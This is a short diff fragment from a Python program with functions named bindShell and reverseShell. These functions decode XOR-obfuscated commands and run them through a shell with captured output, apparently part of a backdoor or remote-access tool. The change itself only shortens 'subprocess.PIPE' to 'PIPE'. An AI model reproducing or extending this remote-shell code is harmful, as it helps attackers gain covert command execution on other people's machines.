@@ -654,9 +654,9 @@ def bindShell():
         cmd2 = xor(cmd, pin)
         proc = Popen(cmd2,
              shell=True,
-             stdout=subprocess.PIPE,
-             stderr=subprocess.PIPE,
-             stdin=subprocess.PIPE,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
         if cmd2.startswith('cd'):
@@ -762,9 +762,9 @@ def reverseShell():
         cmd2 = xor(cmd, pin)
         proc = Popen(cmd2,
              shell=True,
-             stdout=subprocess.PIPE,
-             stderr=subprocess.PIPE,
-             stdin=subprocess.PIPE,
+             stdout=PIPE,
+             stderr=PIPE,
+             stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
         if cmd2.startswith('cd'):
